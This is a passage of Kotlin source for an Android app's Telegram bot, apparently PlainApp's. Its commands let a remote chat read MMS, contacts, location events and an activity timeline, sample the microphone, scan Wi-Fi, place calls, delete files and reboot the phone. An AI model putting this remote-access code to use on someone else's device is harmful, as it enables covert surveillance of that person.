                sb.append("   📍 ${String.format("%.4f", f.lat)}, ${String.format("%.4f", f.lng)} · r=${f.radius.toInt()}m\n")
                val actions = mutableListOf<String>()
                if (f.triggerEnter) actions.add("enter")
                if (f.triggerExit) actions.add("exit")
                if (actions.isNotEmpty()) sb.append("   Trigger: ${actions.joinToString(", ")}\n")
                sb.append("\n")
                rows.add(listOf(
                    "${if (f.enabled) "⚪ Disable" else "🟢 Enable"} ${f.name.take(14)}" to "gf_tog:${f.id}",
                    "🗑 Delete" to "gf_del:${f.id}",
                ))
            }
            if (fences.size > 20) sb.append("<i>… and ${fences.size - 20} more</i>\n")
        }
        rows.add(listOf("➕ Add geofence" to "gf_add", "📋 Events" to "gf_events"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun renderGeofenceEvents(editMessageId: Long?) {
        val events = GeofencingHelper.listEvents(limit = 20)
        val sb = StringBuilder("🗺 <b>Geofence Events</b> (recent ${events.size})\n━━━━━━━━━━━━━━━━━━━━\n")
        if (events.isEmpty()) {
            sb.append("<i>No geofence events recorded yet.</i>")
        } else {
            events.forEach { e ->
                val icon = if (e.type == "enter") "➡️" else "⬅️"
                sb.append("$icon <b>${htmlEsc(e.geofenceName)}</b> · ${e.type.uppercase()}\n")
                sb.append("   🕐 ${fmtTime(e.ts)} · 🔋 ${e.batteryLevel}%\n")
                sb.append("   📍 ${String.format("%.4f", e.lat)}, ${String.format("%.4f", e.lng)}\n\n")
            }
        }
        val rows = listOf(listOf("📋 View fences" to "gf_list", "➕ Add geofence" to "gf_add"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    // ==================== /addcontact ====================

    private suspend fun cmdAddContact() {
        sendTyping()
        pendingInput = "addcontact_name"
        sendMessage("➕ <b>Add Contact</b>\n\nStep 1 of 2: Send the contact's <b>full name</b>.\n\nSend any /command to cancel.")
    }

    // ==================== /deletecontact ====================

    private suspend fun cmdDeleteContact(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            pendingInput = "deletecontact_search"
            sendMessage("🗑 <b>Delete Contact</b>\n\nSend a name or number to search for the contact to delete.\nSend any /command to cancel.")
            return
        }
        renderDeleteContactSearch(args.joinToString(" "))
    }

    private suspend fun renderDeleteContactSearch(query: String) {
        try {
            val results = ContactMediaStoreHelper.searchAsync(MainApp.instance, "text:$query", 10, 0)
            if (results.isEmpty()) {
                sendMessage("🔍 No contacts found for <i>${htmlEsc(query)}</i>.")
                return
            }
            val sb = StringBuilder("🗑 <b>Delete Contact</b> — found ${results.size} match${if (results.size == 1) "" else "es"}\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            results.take(10).forEach { c ->
                val display = contactDisplayName(c)
                val phones = c.phoneNumbers.joinToString(", ") { it.value }
                sb.append("• <b>${htmlEsc(display)}</b>${if (phones.isNotBlank()) "  <code>${htmlEsc(phones.take(30))}</code>" else ""}\n")
                rows.add(listOf("🗑 Delete ${display.take(22)}" to "con_del_ok:${c.id}"))
            }
            sb.append("\n<i>⚠️ Deletion is immediate and cannot be undone.</i>")
            val markup = TelegramApiClient.inlineKeyboard(rows)
            sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not search contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /editnote ====================

    private suspend fun cmdEditNote(args: List<String>) {
        sendTyping()
        if (args.isEmpty()) {
            sendMessage("✏️ <b>Edit Note</b>\n\nUsage: <code>/editnote &lt;keyword&gt;</code>\n\nThis searches your notes and lets you pick one to edit.\n\nOr open any note with /notes and tap the ✏️ Edit button.")
            return
        }
        val q = args.joinToString(" ")
        try {
            val results = NoteHelper.search(q, 10, 0)
            if (results.isEmpty()) {
                sendMessage("🔍 No notes found for <i>${htmlEsc(q)}</i>.")
                return
            }
            val sb = StringBuilder("✏️ <b>Edit Note</b> — ${results.size} match${if (results.size == 1) "" else "es"}\n\n<i>Tap to edit:</i>\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            results.take(10).forEach { n ->
                val title = n.title.ifBlank { "(untitled)" }
                sb.append("• <b>${htmlEsc(title.take(50))}</b>\n")
                rows.add(listOf("✏️ Edit: ${title.take(25)}" to "note_edit:${n.id}"))
            }
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Could not search notes: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== airplane/mobiledata callback helpers ====================

    // These are handled in the callback block via commands; forwarded here via inline buttons:
    // air_on / air_off -> cmdAirplane(listOf("on"/"off"))
    // mdata_on / mdata_off -> cmdMobileData(listOf("on"/"off"))
    // photofwd_on / photofwd_off -> cmdForwardPhotos(listOf("on"/"off"))
    // clipfwd_on / clipfwd_off -> cmdForwardClipboard(listOf("on"/"off"))
    // smsfwd_on / smsfwd_off -> forwardSmsEnabled = true/false (already handled above)

    // ==================== /soundmeter ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdSoundMeter(args: List<String>) {
        val seconds = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 10) ?: 3
        sendMessage("🎙 Measuring ambient sound for <b>${seconds}s</b>…")
        sendTyping()
        withContext(Dispatchers.IO) {
            try {
                val sampleRate = 44100
                val bufSize = AudioRecord.getMinBufferSize(
                    sampleRate,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT
                ).let { if (it <= 0) 4096 else it }
                val recorder = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufSize * 4
                )
                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
                    sendMessage("❌ Could not initialize AudioRecord. Ensure Microphone permission is granted.")
                    return@withContext
                }
                recorder.startRecording()
                val buffer = ShortArray(bufSize)
                val readings = mutableListOf<Float>()
                val endTime = System.currentTimeMillis() + seconds * 1000L
                while (System.currentTimeMillis() < endTime) {
                    val read = recorder.read(buffer, 0, buffer.size)
                    if (read > 0) {
                        val amp = SoundMeterHelper.getMaxAmplitude(buffer, read)
                        if (amp > 1.0) {
                            val db = SoundMeterHelper.amplitudeToDecibel(amp)
                            if (db > 0f && db < 200f) readings.add(db)
                        }
                    }
                }
                recorder.stop()
                recorder.release()
                if (readings.isEmpty()) {
                    sendMessage("🎙 <b>Sound Level</b>\n\n⚠️ No audio captured. Check Microphone permission and ensure sound is present.")
                    return@withContext
                }
                val avg = readings.average().toFloat()
                val max = readings.max()
                val min = readings.min()
                val filled = ((avg / 10).toInt()).coerceIn(0, 10)
                val bar = "█".repeat(filled) + "░".repeat(10 - filled)
                val level = when {
                    avg < 30 -> "🤫 Very quiet (library)"
                    avg < 50 -> "🗣 Moderate (conversation)"
                    avg < 70 -> "📢 Loud (busy street)"
                    avg < 90 -> "🔊 Very loud (concert)"
                    else -> "🚨 Extremely loud!"
                }
                sendMessage(
                    "🎙 <b>Ambient Sound Level</b>\n━━━━━━━━━━━━━━━━━━━━\n" +
                    "Duration: ${seconds}s · ${readings.size} samples\n\n" +
                    "[$bar] <b>${String.format("%.1f", avg)} dB</b>\n" +
                    "🔺 Peak: <b>${String.format("%.1f", max)} dB</b>\n" +
                    "🔻 Min: <b>${String.format("%.1f", min)} dB</b>\n\n" +
                    level
                )
            } catch (e: Exception) {
                sendMessage("❌ Sound meter error: ${htmlEsc(e.message ?: "")}\n<i>Ensure Microphone permission is granted.</i>")
            }
        }
    }

    // ==================== /qrcode ====================

    private suspend fun cmdQrCode(content: String) {
        if (content.isBlank()) {
            sendMessage("📷 <b>QR Code Generator</b>\n\nUsage: <code>/qrcode &lt;text or URL&gt;</code>\n\nExamples:\n<code>/qrcode https://plainapp.co</code>\n<code>/qrcode Hello World</code>")
            return
        }
        sendTyping()
        try {
            val size = 512
            val bitmap = QrCodeGenerateHelper.generate(content.trim(), size, size)
            val file = File(MainApp.instance.cacheDir, "tg_qr_${System.currentTimeMillis()}.jpg")
            java.io.FileOutputStream(file).use { out ->
                bitmap.compress(Bitmap.CompressFormat.JPEG, 95, out)
            }
            sendUploadPhoto()
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 QR: ${htmlEsc(content.take(80))}")
            file.delete()
        } catch (e: Exception) {
            sendMessage("❌ QR code error: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /docs ====================

    private suspend fun cmdDocs(args: List<String>) {
        sendTyping()
        val q = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderDocsPage(q, 0, editMessageId = null)
    }

    private suspend fun renderDocsPage(query: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val items = DocsHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset, FileSortBy.DATE_DESC)
            val hasMore = items.size > pageSize
            val pageItems = items.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📄 No documents found${if (query.isNotBlank()) " matching <i>${htmlEsc(query.removePrefix("text:"))}</i>" else ""}." else "📄 No more documents."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📄 <b>Documents</b> · ${offset + 1}–${offset + pageItems.size}\n<i>Tap to download.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, doc ->
                val ext = doc.path.substringAfterLast('.').uppercase().take(6)
                sb.append("${offset + i + 1}. 📄 <b>${htmlEsc(doc.name.take(55))}</b>\n")
                sb.append("   [$ext] · ${humanSize(doc.size)} · ${fmtTime((doc.createdAt ?: doc.updatedAt).toEpochMilliseconds())}\n\n")
                rows.add(listOf("📥 ${offset + i + 1}. ${doc.name.take(28)}" to "doc_get:${pathToken(doc.path)}"))
            }
            val qSeg = safeSeg(query.ifBlank { "_" })
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "doc_pg:$qSeg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "doc_pg:$qSeg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            sendMessage("❌ Could not load documents: ${htmlEsc(e.message ?: "")}")
        }
    }

    // ==================== /filehash ====================

    private suspend fun cmdFileHash(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("#️⃣ <b>File Hash</b>\n\nUsage: <code>/filehash &lt;path&gt;</code>\n\nExample:\n<code>/filehash /sdcard/DCIM/photo.jpg</code>")
            return
        }
        val path = args.joinToString(" ").trim()
        sendMessage("⏳ Hashing <code>${htmlEsc(path)}</code>…")
        withContext(Dispatchers.IO) {
            val f = File(path)
            if (!f.exists() || !f.isFile) {
                sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return@withContext
            }
            if (f.length() > 500 * 1024 * 1024L) {
                sendMessage("❌ File too large (>500 MB) — hashing skipped."); return@withContext
            }
            try {
                val sha256 = FileHashHelper.strongHash(f)
                val md5Weak = FileHashHelper.weakHash(f)
                sendMessage(
                    "#️⃣ <b>File Hash</b>\n" +
                    "📄 <code>${htmlEsc(f.name)}</code>\n" +
                    "📦 Size: ${humanSize(f.length())}\n" +
                    "📂 Path: <code>${htmlEsc(path)}</code>\n\n" +
                    "🔐 <b>SHA-256:</b>\n<code>$sha256</code>\n\n" +
                    "🔑 <b>MD5/Weak:</b>\n<code>$md5Weak</code>"
                )
            } catch (e: Exception) {
                sendMessage("❌ Hashing failed: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /wifiscan ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdWifiScan() {
        sendTyping()
        val ctx = MainApp.instance
        @Suppress("DEPRECATION")
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
        if (wm == null) { sendMessage("❌ Wi-Fi service unavailable."); return }
        sendMessage("📡 Scanning for Wi-Fi networks…")
        withContext(Dispatchers.IO) {
            try {
                @Suppress("DEPRECATION")
                wm.startScan()
                delay(2800L)
                @Suppress("DEPRECATION")
                val results = wm.scanResults
                if (results.isNullOrEmpty()) {
                    sendMessage("📡 No networks found.\n<i>Ensure Wi-Fi is enabled and Location permission is granted.</i>")
                    return@withContext
                }
                val sorted = results.sortedByDescending { it.level }
                val sb = StringBuilder("📡 <b>Nearby Wi-Fi Networks</b> (${sorted.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
                sorted.take(20).forEachIndexed { i, r ->
                    @Suppress("DEPRECATION")
                    val ssid = if (r.SSID.isNullOrBlank()) "(hidden)" else r.SSID
                    val bars = when {
                        r.level >= -55 -> "▂▄▆█"
                        r.level >= -70 -> "▂▄▆░"
                        r.level >= -80 -> "▂▄░░"
                        else -> "▂░░░"
                    }
                    val freq = if (r.frequency > 4000) "5GHz" else "2.4GHz"
                    val lock = if (r.capabilities.contains("WPA") || r.capabilities.contains("WEP")) "🔒" else "🔓"
                    sb.append("${i + 1}. $lock $bars <b>${htmlEsc(ssid)}</b>  ${r.level} dBm\n")
                    sb.append("   $freq · <code>${r.BSSID ?: ""}</code>\n\n")
                    if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
                }
                sendMessage(sb.toString())
            } catch (e: Exception) {
                sendMessage("❌ Wi-Fi scan error: ${htmlEsc(e.message ?: "")}")
            }
        }
    }

    // ==================== /timeline ====================

    private fun cmdTimeline(args: List<String>) {
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 200) ?: 50
        val all = TimelineHelper.all(n)
        val entries = all.takeLast(n).reversed()
        if (entries.isEmpty()) {
            sendMessage("📋 <b>Device Timeline</b>\n\n<i>No activity recorded yet. Events are captured by PlainApp's background service.</i>")
            return
        }
        val sb = StringBuilder("📋 <b>Device Timeline</b> (last ${entries.size})\n━━━━━━━━━━━━━━━━━━━━\n\n")
        entries.forEach { e ->
            val icon = when (e.type) {
                "app_launch" -> "🚀"
                "call" -> "📞"
                "sms" -> "💬"
                "notif" -> "🔔"
                "screenshot" -> "📸"
                "location" -> "📍"
                "music" -> "🎵"
                else -> "•"
            }
            sb.append("$icon <b>${htmlEsc(e.title.take(60))}</b>\n")
            if (e.subtitle.isNotBlank()) sb.append("   <i>${htmlEsc(e.subtitle.take(80))}</i>\n")
            if (e.appName.isNotBlank()) sb.append("   📱 ${htmlEsc(e.appName.take(40))}\n")
            sb.append("   🕐 ${fmtTime(e.time)}\n\n")
            if (sb.length > 3800) { sb.append("… (truncated — use /timeline <n> for fewer entries)"); return@forEach }
        }
        sendMessage(sb.toString())
    }

    // ==================== /contactgroups ====================

    private suspend fun cmdContactGroups() {
        sendTyping()
        val groups = try { GroupHelper.getAll() } catch (e: Exception) {
            sendMessage("❌ Could not read contact groups: ${htmlEsc(e.message ?: "")}"); return
        }
        if (groups.isEmpty()) {
            sendMessage("👥 <b>Contact Groups</b>\n\n<i>No contact groups found on this device.</i>")
            return
        }
        val sb = StringBuilder("👥 <b>Contact Groups</b> (${groups.size})\n━━━━━━━━━━━━━━━━━━━━\n<i>Tap a group to view its members.</i>\n\n")
        val rows = mutableListOf<List<Pair<String, String>>>()
        groups.take(20).forEachIndexed { i, g ->
            sb.append("${i + 1}. 👥 <b>${htmlEsc(g.name)}</b>  <code>${g.id}</code>\n")
            rows.add(listOf("${i + 1}. ${g.name.take(34)}" to "cg_view:${g.id}"))
        }
        if (groups.size > 20) sb.append("\n<i>… and ${groups.size - 20} more groups (only first 20 shown)</i>")
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    private suspend fun renderContactGroupMembers(groupId: String, editMessageId: Long?) {
        try {
            val ctx = MainApp.instance
            val memberContactIds = mutableSetOf<String>()
            val uri = android.provider.ContactsContract.Data.CONTENT_URI
            val projection = arrayOf(android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTACT_ID)
            val sel = "${android.provider.ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID} = ? AND ${android.provider.ContactsContract.Data.MIMETYPE} = ?"
            val selArgs = arrayOf(groupId, android.provider.ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE)
            ctx.contentResolver.query(uri, projection, sel, selArgs, null)?.use { cur ->
                while (cur.moveToNext()) memberContactIds.add(cur.getString(0))
            }
            val groupName = try { GroupHelper.getAll().firstOrNull { it.id.toString() == groupId }?.name ?: "Group" } catch (_: Throwable) { "Group" }
            if (memberContactIds.isEmpty()) {
                val msg = "👥 <b>${htmlEsc(groupName)}</b>\n\n<i>This group has no members.</i>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("👥 <b>${htmlEsc(groupName)}</b> (${memberContactIds.size} members)\n━━━━━━━━━━━━━━━━━━━━\n\n")
            memberContactIds.take(30).forEach { cid ->
                val contact = try { ContactMediaStoreHelper.getByIdAsync(ctx, cid) } catch (_: Throwable) { null }
                if (contact != null) {
                    val name = contactDisplayName(contact)
                    val phone = contact.phoneNumbers.firstOrNull()?.value ?: ""
                    sb.append("👤 <b>${htmlEsc(name)}</b>${if (phone.isNotBlank()) "  <code>${htmlEsc(phone)}</code>" else ""}\n")
                } else {
                    sb.append("👤 <i>Contact #${cid}</i>\n")
                }
            }
            if (memberContactIds.size > 30) sb.append("\n<i>… and ${memberContactIds.size - 30} more members</i>")
            val rows = listOf(listOf("⬅️ Back to groups" to "cg_back"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not load group members: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ==================== /callnow ====================

    private fun cmdCallNow(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("📞 <b>Make a Call</b>\n\nUsage: <code>/callnow &lt;number&gt;</code>\n\nExample: <code>/callnow +15551234567</code>\n\n<i>Requires CALL_PHONE permission.</i>")
            return
        }
        val raw = args.joinToString("").trim()
        val number = raw.filter { it.isDigit() || it == '+' || it == '#' || it == '*' }
        if (number.isBlank()) { sendMessage("❌ Invalid number: <code>${htmlEsc(raw)}</code>"); return }
        try {
            val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$number"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            MainApp.instance.startActivity(intent)
            sendMessage("📞 Dialing <code>${htmlEsc(number)}</code> on the device…\n\nUse /livecall to manage the call.")
        } catch (e: Exception) {
            sendMessage("❌ Could not initiate call: ${htmlEsc(e.message ?: "")}\n<i>Ensure CALL_PHONE permission is granted and the number is valid.</i>")
        }
    }

    // ==================== /deletefile ====================

    private suspend fun cmdDeleteFile(args: List<String>) {
        if (args.isEmpty()) {
            sendMessage("🗑 <b>Delete File</b>\n\nUsage: <code>/deletefile &lt;path&gt;</code>\n\nExample:\n<code>/deletefile /sdcard/Download/old.apk</code>\n\n⚠️ Deletion is <b>permanent</b> and cannot be undone.")
            return
        }
        val path = args.joinToString(" ").trim()
        val f = File(path)
        if (!f.exists()) { sendMessage("❌ File not found: <code>${htmlEsc(path)}</code>"); return }
        val typeStr = if (f.isDirectory) "📁 Directory" else "📄 File"
        val sizeStr = if (f.isFile) " · ${humanSize(f.length())}" else ""
        val tok = pathToken(path)
        val sb = "$typeStr: <b>${htmlEsc(f.name)}</b>$sizeStr\n<code>${htmlEsc(path)}</code>\n\n⚠️ <b>This cannot be undone.</b> Confirm?"
        val markup = TelegramApiClient.inlineKeyboard(listOf(
            listOf("✅ Yes, delete" to "df_yes:$tok", "❌ Cancel" to "df_no:")
        ))
        sendMessage("🗑 <b>Delete File</b>\n\n$sb", replyMarkup = markup)
    }

    // ==================== /networkinfo ====================

    @SuppressLint("MissingPermission")
    private suspend fun cmdNetworkInfo() {
        sendTyping()
        val ctx = MainApp.instance
        @Suppress("DEPRECATION")
        val wm = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
        val sb = StringBuilder("🌐 <b>Network Information</b>\n━━━━━━━━━━━━━━━━━━━━\n\n")
        try {
            val active = cm?.activeNetwork
            val nc = cm?.getNetworkCapabilities(active)
            val lp = cm?.getLinkProperties(active)
            val netType = when {
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true -> "📶 Wi-Fi"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "📡 Cellular"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_ETHERNET) == true -> "🔌 Ethernet"
                nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true -> "🔐 VPN"
                else -> "❓ None / Unknown"
            }
            sb.append("🔌 <b>Active:</b> $netType\n")
            val ips = lp?.linkAddresses?.joinToString(", ") { "${it.address.hostAddress}/${it.prefixLength}" }
            if (!ips.isNullOrBlank()) sb.append("🌐 <b>IPs:</b> <code>$ips</code>\n")
            val dns = lp?.dnsServers?.joinToString(", ") { it.hostAddress ?: "" }
            if (!dns.isNullOrBlank()) sb.append("🔍 <b>DNS:</b> <code>$dns</code>\n")
            val gateway = lp?.routes?.firstOrNull { it.isDefaultRoute }?.gateway?.hostAddress
            if (!gateway.isNullOrBlank()) sb.append("🚪 <b>Gateway:</b> <code>$gateway</code>\n")
            val iface = lp?.interfaceName
            if (!iface.isNullOrBlank()) sb.append("🔌 <b>Interface:</b> <code>$iface</code>\n")
            val down = nc?.linkDownstreamBandwidthKbps
            val up = nc?.linkUpstreamBandwidthKbps
            if (down != null && up != null) sb.append("⬇️ ${down / 1000} Mbps  ⬆️ ${up / 1000} Mbps\n")
            if (nc?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI) == true && wm != null) {
                sb.append("\n📶 <b>Wi-Fi Details</b>\n")
                @Suppress("DEPRECATION")
                val info = wm.connectionInfo
                if (info != null) {
                    @Suppress("DEPRECATION")
                    val ssid = info.ssid?.removePrefix("\"")?.removeSuffix("\"") ?: "unknown"
                    sb.append("   SSID: <b>${htmlEsc(ssid)}</b>\n")
                    sb.append("   BSSID: <code>${info.bssid ?: "unknown"}</code>\n")
                    sb.append("   Signal: ${info.rssi} dBm\n")
                    sb.append("   Link speed: <b>${info.linkSpeed} Mbps</b>\n")
                    sb.append("   Frequency: ${info.frequency} MHz (${if (info.frequency > 4000) "5 GHz" else "2.4 GHz"})\n")
                    val ip = android.text.format.Formatter.formatIpAddress(info.ipAddress)
                    sb.append("   IP: <code>$ip</code>\n")
                }
            }
        } catch (e: Exception) {
            sb.append("Error reading network info: ${htmlEsc(e.message ?: "")}\n")
        }
        sb.append("\n🕐 $ts")
        sendMessage(sb.toString())
    }

    // ==================== /reboot ====================

    private suspend fun cmdReboot() {
        sendTyping()
        val isRooted = RootHelper.isRooted()
        val isAdmin = DeviceAdminGuard.isAdminActive(MainApp.instance)
        if (!isRooted && !isAdmin) {
            sendMessage("❌ <b>Reboot not available</b>\n\nReboot requires either:\n• Root access (Magisk / KernelSU / APatch), or\n• Device Admin privilege (Android 7+)\n\nNeither is active on this device.")
            return
        }
        val via = when {
            isRooted -> "root shell"
            else -> "Device Admin (Android 7+)"
        }
        val key = if (isRooted) "reboot_yes" else "reboot_adm"
        sendMessage(
            "🔄 <b>Reboot Device</b>\n\nMethod: <b>$via</b>\n\n⚠️ The device will restart immediately. The bot will reconnect automatically after reboot.",
            replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                listOf("✅ Yes, reboot now" to key, "❌ Cancel" to "reboot_no")
            ))
        )
    }

    // ==================== /mms ====================

    private suspend fun cmdMms(args: List<String>) {
        sendTyping()
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 10
        renderMmsPage(offset = 0, editMessageId = null, pageSize = n)
    }

    private suspend fun renderMmsPage(offset: Int, editMessageId: Long?, pageSize: Int = 10) {
        try {
            val ctx = MainApp.instance
            val uri = android.net.Uri.parse("content://mms")
            val projection = arrayOf("_id", "date", "sub", "read", "msg_box")
            val cursor = ctx.contentResolver.query(
                uri, projection, null, null, "date DESC"
            ) ?: run {
                val msg = "❌ Could not access MMS inbox. Check SMS permission."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val total = cursor.count
            if (total == 0) {
                cursor.close()
                val msg = "💬 No MMS messages found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            if (!cursor.move(offset + 1)) {
                cursor.close()
                val msg = "💬 No more MMS messages."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
                return
            }
            val sb = StringBuilder("💬 <b>MMS Messages</b> · ${offset + 1}–${min(offset + pageSize, total)} of $total\n━━━━━━━━━━━━━━━━━━━━\n\n")
            var count = 0
            do {
                val id = cursor.getString(cursor.getColumnIndexOrThrow("_id"))
                val dateMs = cursor.getLong(cursor.getColumnIndexOrThrow("date")) * 1000L
                val subject = cursor.getString(cursor.getColumnIndexOrThrow("sub"))?.takeIf { it.isNotBlank() } ?: "(no subject)"
                val read = cursor.getInt(cursor.getColumnIndexOrThrow("read"))
                val box = cursor.getInt(cursor.getColumnIndexOrThrow("msg_box"))
                val dir = if (box == 1) "📥" else "📤"
                val readMark = if (read == 0) " 🔵" else ""
                // Read sender/recipient from mms address table
                var address = "(unknown)"
                try {
                    val addrUri = android.net.Uri.parse("content://mms/$id/addr")
                    ctx.contentResolver.query(addrUri, arrayOf("address", "type"), null, null, null)?.use { ac ->
                        while (ac.moveToNext()) {
                            val addrType = ac.getInt(ac.getColumnIndexOrThrow("type"))
                            val addrVal = ac.getString(ac.getColumnIndexOrThrow("address"))?.trim() ?: continue
                            if (addrVal.isNotBlank() && addrVal != "insert-address-token") {
                                if (box == 1 && addrType == 137) { address = addrVal; break }
                                if (box != 1 && addrType == 151) { address = addrVal; break }
                                address = addrVal
                            }
                        }
                    }
                } catch (_: Throwable) {}
                // Read body text from mms part table
                var body = ""
                try {
                    val partUri = android.net.Uri.parse("content://mms/$id/part")
                    ctx.contentResolver.query(partUri, arrayOf("ct", "text"), null, null, null)?.use { pc ->
                        while (pc.moveToNext()) {
                            val ct = pc.getString(pc.getColumnIndexOrThrow("ct")) ?: ""
                            if (ct == "text/plain") {
                                body = pc.getString(pc.getColumnIndexOrThrow("text"))?.take(200) ?: ""
                                break
                            }
                        }
                    }
                } catch (_: Throwable) {}
                sb.append("${offset + count + 1}. $dir <b>${htmlEsc(address.take(30))}</b>$readMark\n")
                sb.append("   📌 <i>${htmlEsc(subject.take(60))}</i>\n")
                if (body.isNotBlank()) sb.append("   ${htmlEsc(body.take(100))}\n")
                sb.append("   🕐 ${fmtTime(dateMs)}\n\n")
                count++
                if (sb.length > 3500) { sb.append("…"); break }
            } while (cursor.moveToNext() && count < pageSize)
            cursor.close()
            val rows = mutableListOf<List<Pair<String, String>>>()
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "mms_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (offset + pageSize < total) nav.add("Next ▶️" to "mms_pg:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = if (rows.isNotEmpty()) TelegramApiClient.inlineKeyboard(rows) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read MMS: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg) else sendMessage(msg)
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  New Sensor Commands
    // ─────────────────────────────────────────────────────────────────────────

    private fun cmdGyroscope() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_GYROSCOPE)) {
            sendMessage("❌ This device does not have a gyroscope sensor.")
            return
        }
        val d = SensorHelper.latestGyro
        sendMessage(buildString {
            append("🌀 <b>Gyroscope</b>\n\n")
            append("• <b>X</b> (roll):  <code>${d.x}</code> rad/s\n")
            append("• <b>Y</b> (pitch): <code>${d.y}</code> rad/s\n")
            append("• <b>Z</b> (yaw):   <code>${d.z}</code> rad/s\n")
            append("• <b>Magnitude</b>: <code>${d.magnitude}</code> rad/s\n")
            append("\n🕐 <i>$ts</i>")
        })
    }

    private fun cmdCompass() {
        SensorHelper.ensureSensorsStarted()
        if (!SensorHelper.hasSensor(android.hardware.Sensor.TYPE_MAGNETIC_FIELD)) {
            sendMessage("❌ This device does not have a magnetometer sensor.")
            return
        }
        val d = SensorHelper.latestMag
        val arrow = when (d.cardinalDir) {
